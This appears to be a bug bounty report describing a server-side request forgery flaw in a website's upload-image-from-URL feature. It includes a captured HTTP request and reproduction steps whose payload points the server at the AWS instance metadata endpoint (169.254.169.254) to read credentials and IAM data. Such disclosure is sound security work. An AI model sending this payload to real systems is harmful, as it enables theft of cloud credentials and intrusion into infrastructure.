# Upoad image from external URL can lead to SSRF

#### Description

I identified that upload image from URL feature is vulnerable to ssrf, by injecting a specially crafted URL, an attacker can exploit this vulnerability to send arbitrary requests to the backend server, including requests to the AWS metadata endpoint. This could potentially allow an attacker to extract sensitive data, such as AWS access keys, IAM roles, or instance metadata. 

#### POST Request

```
POST /exp.php HTTP/2
Host: example.com
Cookie: _ga=GA1.2.448835302.1663006136; __gads=ID=12650bacbbb407c1-22b25b0367d600ff:T=1663006138:RT=1663006138:S=ALNI_MbIQgv1tetv5sWhtd2l-DWa5gpBAw; _gid=GA1.2.1181242970.1684070063; _gat_UA-129663421-2=1; __gpi=UID=000009c37d6d17f9:T=1663006138:RT=1684070064:S=ALNI_Mbde2euUm1z5T_fwwj9zbyEtdMKrA
Content-Length: 46
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://example.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://example.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

url=http://169.254.169.254/latest/meta-data/
```


#### Steps to reproduce

1. Navigate to the upload image from url feature on your website.
2. Enter the following payload into the URL parameter: http://169.254.169.254/latest/meta-data/
3. Capture the request in burp > Send to Repeater > Submit
4. Observe the response

#### Impact

The SSRF vulnerability through the image upload feature can enable an attacker to bypass authentication and authorization mechanisms and gain unauthorized access to AWS metadata files. This poses a significant risk, as it could lead to unauthorized access to sensitive resources and potentially compromise the entire AWS infrastructure.
